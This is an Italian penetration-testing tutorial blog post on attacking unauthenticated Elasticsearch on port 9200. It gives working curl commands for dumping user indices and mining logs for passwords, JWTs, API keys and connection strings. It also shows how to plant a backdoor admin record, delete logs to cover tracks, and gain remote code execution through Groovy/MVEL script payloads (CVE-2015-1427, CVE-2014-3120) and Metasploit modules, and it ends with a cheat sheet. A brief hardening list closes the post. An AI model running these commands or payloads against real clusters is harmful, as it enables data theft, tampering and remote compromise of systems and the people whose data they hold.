---
title: 'Porta 9200 Elasticsearch: Dump Indici, Credenziali e Groovy RCE'
slug: porta-9200-elasticsearch
description: 'Porta 9200 Elasticsearch senza autenticazione: dump indici con credenziali e PII, ricerca password nei log, Groovy script RCE, CVE-2015-1427, elasticdump e lateral movement da ELK stack.'
image: /porta-9200-elasticsearch.webp
draft: true
date: 2026-04-19T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - elasticsearch-pentest
  - elk-stack-exploitation
  - elasticsearch-no-auth
---

Elasticsearch è il motore di ricerca e analytics distribuito più utilizzato al mondo: alimenta ricerche full-text, log analytics (stack ELK), metriche applicative, SIEM e qualsiasi sistema che ha bisogno di cercare velocemente in grandi quantità di dati. Ascolta sulla porta 9200 TCP (REST API) e 9300 TCP (trasporto inter-nodo). Nel penetration testing, Elasticsearch è uno dei servizi con il rapporto impegno/risultato più alto: storicamente distribuito **senza autenticazione di default**, espone la sua intera REST API a chiunque possa raggiungere la porta 9200. E quella API permette di fare tutto: leggere ogni documento indicizzato, cercare credenziali nei log, modificare o cancellare dati, e in alcune versioni eseguire codice arbitrario tramite scripting. Se hai trovato [Kibana sulla porta 5601](https://hackita.it/articoli/porta-5601-kibana), sai già che Elasticsearch è il database dietro — ma accedere direttamente alla 9200 è spesso ancora più potente, perché non hai le limitazioni dell'interfaccia Kibana.

Un Elasticsearch tipico in produzione contiene: log di tutte le applicazioni (con password nei parametri URL, token JWT, header Authorization), metriche di business, dati utente indicizzati per la ricerca, audit trail — è la memoria storica completa dell'infrastruttura.

## Architettura Elasticsearch

```
Applicazioni                    Elasticsearch Cluster
┌──────────────┐               ┌─────────────────────────────┐
│ Logstash     │── bulk ─────►│ Node 1 (:9200) - Master     │
│ Filebeat     │── insert ───►│   ├── indice: logs-nginx-*   │
│ App diretta  │── API ──────►│   ├── indice: logs-app-*     │
│              │               │   ├── indice: users          │
│ Kibana (:5601)◄── query ───│   └── indice: transactions   │
│              │               │                              │
│              │               │ Node 2 (:9200) - Data       │
│              │               │ Node 3 (:9200) - Data       │
│              │               └─────────────────────────────┘
```

| Porta    | Funzione                             |
| -------- | ------------------------------------ |
| **9200** | REST API — tutte le operazioni       |
| 9300     | Transport — comunicazione inter-nodo |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 9200,9300 10.10.10.40
```

### Versione e stato del cluster

```bash
curl -s http://10.10.10.40:9200/ | python3 -m json.tool
```

```json
{
    "name": "es-prod-01",
    "cluster_name": "production",
    "cluster_uuid": "abc123...",
    "version": {
        "number": "8.11.3",
        "build_flavor": "default",
        "lucene_version": "9.8.0"
    },
    "tagline": "You Know, for Search"
}
```

Se risponde con JSON → **accesso senza autenticazione**. Nessun errore 401, nessun prompt per credenziali. Hai accesso completo.

**Intelligence:** hostname (`es-prod-01`), nome cluster (`production`), versione esatta (per CVE).

### Salute del cluster

```bash
curl -s http://10.10.10.40:9200/_cluster/health | python3 -m json.tool
```

```json
{
    "cluster_name": "production",
    "status": "green",
    "number_of_nodes": 3,
    "number_of_data_nodes": 3,
    "active_primary_shards": 150,
    "active_shards": 300
}
```

3 nodi, 150 shard primari — è un cluster di produzione serio.

### Nodi del cluster

```bash
curl -s http://10.10.10.40:9200/_cat/nodes?v
```

```
ip           name        node.role version
10.10.10.40  es-prod-01  cdfhilmr  8.11.3
10.10.10.41  es-prod-02  cdfhilmr  8.11.3
10.10.10.42  es-prod-03  cdfhilmr  8.11.3
```

Tre nodi con IP → tutti raggiungibili sulla 9200.

## 2. Autenticazione

### Senza autenticazione (default fino a Elasticsearch 7.x)

Le versioni OSS (Open Source) di Elasticsearch non hanno autenticazione. La versione 8.x con X-Pack Security abilita l'auth di default, ma:

* Installazioni migrated da versioni vecchie → spesso senza auth
* Docker images custom → `xpack.security.enabled: false`
* Ambienti dev/staging promossi in produzione → nessuna protezione

### Default credentials (con X-Pack Security)

| Username  | Password   | Ruolo     |
| --------- | ---------- | --------- |
| `elastic` | `changeme` | Superuser |
| `elastic` | `elastic`  | Variante  |

```bash
curl -s -u elastic:changeme http://10.10.10.40:9200/
```

### Credenziali da Kibana

Se hai già compromesso [Kibana](https://hackita.it/articoli/porta-5601-kibana):

```bash
cat /etc/kibana/kibana.yml | grep elasticsearch.password
```

```yaml
elasticsearch.username: "kibana_system"
elasticsearch.password: "K1bana_Pr0d_2025!"
```

## 3. Enumerazione Indici — Cosa Contiene il Cluster

```bash
# Lista tutti gli indici (ordinati per dimensione)
curl -s http://10.10.10.40:9200/_cat/indices?v&s=store.size:desc
```

```
health status index                docs.count  store.size
green  open   logs-nginx-2026.02    25000000    18.5gb
green  open   logs-app-2026.02      12000000     8.2gb
green  open   logs-auth-2026.02      5000000     3.1gb
green  open   users                    150000   890.5mb
green  open   transactions           2000000     2.3gb
green  open   apm-2026.02             500000   450.2mb
green  open   .kibana                     85   256.0kb
green  open   .security-7                 12    48.0kb
```

Gli indici più interessanti: `logs-auth` (credenziali nei log), `users` (dati utente), `transactions` (dati finanziari), `.security-7` (utenti Elasticsearch con hash).

## 4. Extraction — Credenziali e Dati Sensibili

### Struttura di un indice

```bash
# Mapping (schema) dell'indice users
curl -s http://10.10.10.40:9200/users/_mapping | python3 -m json.tool
```

```json
{
    "users": {
        "mappings": {
            "properties": {
                "username": {"type": "keyword"},
                "email": {"type": "keyword"},
                "password_hash": {"type": "keyword"},
                "role": {"type": "keyword"},
                "api_key": {"type": "keyword"},
                "phone": {"type": "text"},
                "created_at": {"type": "date"}
            }
        }
    }
}
```

Campi `password_hash` e `api_key` — tutto indicizzato e ricercabile.

### Dump utenti

```bash
curl -s http://10.10.10.40:9200/users/_search?size=100 | python3 -m json.tool
```

```json
{
    "hits": {
        "total": {"value": 150000},
        "hits": [
            {
                "_source": {
                    "username": "admin",
                    "email": "admin@corp.com",
                    "password_hash": "$2b$12$abc...",
                    "role": "administrator",
                    "api_key": "ak_live_abc123..."
                }
            }
        ]
    }
}
```

150.000 utenti con hash e API key. Hash bcrypt → [Hashcat](https://hackita.it/articoli/hashcat) mode 3200.

### Ricerca credenziali nei log

```bash
# Password nei parametri URL (log web server)
curl -s "http://10.10.10.40:9200/logs-nginx-*/_search" \
  -H "Content-Type: application/json" \
  -d '{"query":{"query_string":{"query":"password OR passwd OR secret"}},"size":50}'
```

```bash
# Header Authorization (token in chiaro)
curl -s "http://10.10.10.40:9200/logs-*/_search" \
  -H "Content-Type: application/json" \
  -d '{"query":{"query_string":{"query":"Authorization AND (Bearer OR Basic)"}},"size":50}'
```

```bash
# JWT tokens
curl -s "http://10.10.10.40:9200/logs-*/_search" \
  -H "Content-Type: application/json" \
  -d '{"query":{"query_string":{"query":"eyJ"}},"size":50}'
```

```bash
# API keys
curl -s "http://10.10.10.40:9200/logs-*/_search" \
  -H "Content-Type: application/json" \
  -d '{"query":{"query_string":{"query":"api_key OR apikey OR X-API-Key"}},"size":50}'
```

```bash
# Connection string con credenziali
curl -s "http://10.10.10.40:9200/logs-app-*/_search" \
  -H "Content-Type: application/json" \
  -d '{"query":{"query_string":{"query":"jdbc OR mongodb:// OR redis:// OR amqp://"}},"size":50}'
```

### Hostname interni (mappa della rete)

```bash
# Aggregazione su hostname
curl -s "http://10.10.10.40:9200/logs-*/_search" \
  -H "Content-Type: application/json" \
  -d '{"aggs":{"hosts":{"terms":{"field":"host.name.keyword","size":100}}},"size":0}'
```

### Transazioni finanziarie

```bash
curl -s "http://10.10.10.40:9200/transactions/_search?size=20&sort=amount:desc" | python3 -m json.tool
```

### Dump massivo

```bash
# Scroll API per scaricare tutti i documenti
SCROLL_ID=$(curl -s "http://10.10.10.40:9200/users/_search?scroll=1m" \
  -H "Content-Type: application/json" \
  -d '{"size":1000}' | python3 -c "import json,sys;print(json.load(sys.stdin)['_scroll_id'])")

# Continua a scorrere
curl -s "http://10.10.10.40:9200/_search/scroll" \
  -H "Content-Type: application/json" \
  -d "{\"scroll\":\"1m\",\"scroll_id\":\"$SCROLL_ID\"}"
```

```bash
# Alternativa: elasticdump (più semplice)
elasticdump --input=http://10.10.10.40:9200/users --output=users_dump.json --type=data
```

## 5. Modifica e Cancellazione Dati

### Creare un documento (backdoor persistente)

```bash
# Crea un utente admin nell'indice users
curl -s -X POST http://10.10.10.40:9200/users/_doc/ \
  -H "Content-Type: application/json" \
  -d '{"username":"backdoor","email":"b@evil.com","role":"administrator","api_key":"attacker_key","password_hash":"$2b$12$..."}'
```

Se l'applicazione legge gli utenti da Elasticsearch → hai creato un utente admin.

### Cancellare tracce (anti-forensics)

```bash
# Cancella i log delle tue attività
curl -s -X POST "http://10.10.10.40:9200/logs-*/_delete_by_query" \
  -H "Content-Type: application/json" \
  -d '{"query":{"match":{"source.ip":"10.10.10.200"}}}'
```

### Modificare dati

```bash
# Modifica un documento
curl -s -X POST "http://10.10.10.40:9200/users/_update/DOC_ID" \
  -H "Content-Type: application/json" \
  -d '{"doc":{"role":"administrator"}}'
```

## 6. RCE — Remote Code Execution

### Groovy Scripting (Elasticsearch 1.x-2.x)

Nelle versioni vecchie, lo scripting Groovy era abilitato di default:

```bash
# Elasticsearch 1.x — RCE via search query
curl -s -X POST http://10.10.10.40:9200/_search \
  -H "Content-Type: application/json" \
  -d '{"query":{"match_all":{}},"script_fields":{"cmd":{"script":"import java.io.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()"}}}'
```

```
uid=1000(elasticsearch) gid=1000(elasticsearch) groups=1000(elasticsearch)
```

### CVE-2015-1427 — Groovy Sandbox Bypass

```bash
curl -s -X POST http://10.10.10.40:9200/_search \
  -H "Content-Type: application/json" \
  -d '{"size":1,"script_fields":{"cmd":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").text"}}}'
```

### CVE-2014-3120 — MVEL Script RCE

```bash
# Ancora più vecchio — Elasticsearch < 1.2
curl -s -X POST http://10.10.10.40:9200/_search \
  -H "Content-Type: application/json" \
  -d '{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"cmd":{"script":"import java.io.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()"}}}'
```

### Painless Scripting (Elasticsearch 5.x+)

Painless è il linguaggio di scripting moderno di Elasticsearch, con sandbox più robusto. Ma CVE esistono:

**CVE-2018-17246** — Kibana LFI (che porta a RCE via Elasticsearch)

### Metasploit

```bash
use exploit/multi/elasticsearch/script_mvel_rce
set RHOSTS 10.10.10.40
run

# Oppure
use exploit/multi/elasticsearch/search_groovy_script
set RHOSTS 10.10.10.40
run
```

### Verifica scripting

```bash
# Quale scripting è abilitato?
curl -s http://10.10.10.40:9200/_cluster/settings?include_defaults=true | python3 -c "
import json,sys
s = json.load(sys.stdin)
# Cerca script settings
print(json.dumps({k:v for k,v in s.get('defaults',{}).items() if 'script' in k}, indent=2))
"
```

## 7. Utenti Elasticsearch (X-Pack Security)

Se `.security-7` è accessibile:

```bash
curl -s http://10.10.10.40:9200/.security-7/_search?size=100 | python3 -m json.tool
```

Contiene gli utenti con hash password e ruoli di Elasticsearch/Kibana.

## 8. Lateral Movement

```bash
# Da Elasticsearch, le credenziali trovate → test su altri servizi:

# Database creds dai log → PostgreSQL, MySQL, MongoDB
# Connection string: jdbc:postgresql://db-prod:5432/app user=webapp password=...

# AWS keys dai log applicativi → aws-cli
# AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY nei log → aws sts get-caller-identity

# Hostname interni dai target Prometheus e dai log → nmap scan
# 10.10.10.0/24 range completo mappato
```

Le credenziali trovate → [PostgreSQL](https://hackita.it/articoli/porta-5432-postgresql), [MySQL](https://hackita.it/articoli/porta-3306-mysql), [Redis](https://hackita.it/articoli/porta-6379-redis), [SSH](https://hackita.it/articoli/ssh), [WinRM](https://hackita.it/articoli/porta-5985-winrm), [AWS](https://hackita.it/articoli/aws-privilege-escalation).

## 9. Detection & Hardening

* **Abilita X-Pack Security** — autenticazione obbligatoria (default da ES 8.x)
* **Password forte per `elastic`** — non `changeme`
* **Non esporre la 9200 su Internet** — mai
* **TLS** tra nodi e per l'API
* **RBAC** — utenti con permessi solo sugli indici necessari
* **Disabilita scripting** se non necessario: `script.allowed_types: none`
* **Firewall** — porta 9200 solo da Kibana e applicazioni autorizzate
* **Non indicizzare credenziali** — sanitizza i log prima dell'ingest (Logstash filter)
* **Audit log** — abilita per tracciare query e modifiche
* **Snapshot encrypted** per i backup

## 10. Cheat Sheet Finale

| Azione         | Comando                                                           |
| -------------- | ----------------------------------------------------------------- |
| Nmap           | `nmap -sV -p 9200,9300 target`                                    |
| Versione       | `curl http://target:9200/`                                        |
| Cluster health | `curl http://target:9200/_cluster/health`                         |
| Nodi           | `curl http://target:9200/_cat/nodes?v`                            |
| Lista indici   | `curl http://target:9200/_cat/indices?v&s=store.size:desc`        |
| Mapping        | `curl http://target:9200/INDEX/_mapping`                          |
| Cerca tutto    | `curl http://target:9200/INDEX/_search?size=100`                  |
| Cerca password | `curl ... -d '{"query":{"query_string":{"query":"password"}}}'`   |
| Cerca JWT      | `curl ... -d '{"query":{"query_string":{"query":"eyJ"}}}'`        |
| Hostname       | Aggregazione `host.name.keyword`                                  |
| Dump           | `elasticdump --input=http://target:9200/INDEX --output=dump.json` |
| Crea doc       | `curl -X POST .../INDEX/_doc/ -d '{...}'`                         |
| Cancella       | `curl -X POST .../_delete_by_query -d '{"query":{...}}'`          |
| Default creds  | `elastic:changeme`                                                |
| Groovy RCE     | `script_fields` con `Runtime.exec()` (ES 1.x-2.x)                 |
| MSF            | `exploit/multi/elasticsearch/script_mvel_rce`                     |
| Searchsploit   | `searchsploit elasticsearch`                                      |

***

Riferimento: Elasticsearch Security documentation, HackTricks Elasticsearch, CVE-2015-1427, OSCP methodology. Uso esclusivo in ambienti autorizzati. [https://www.pentestpad.com/port-exploit/port-9200-elasticsearch](https://www.pentestpad.com/port-exploit/port-9200-elasticsearch)

> Elasticsearch è il database che contiene tutto — se non è protetto, chiunque può leggerlo. [Penetration test HackIta](https://hackita.it/servizi) per verificare la tua infrastruttura ELK. Per imparare ad attaccare e difendere: [formazione professionale 1:1](https://hackita.it/formazione).
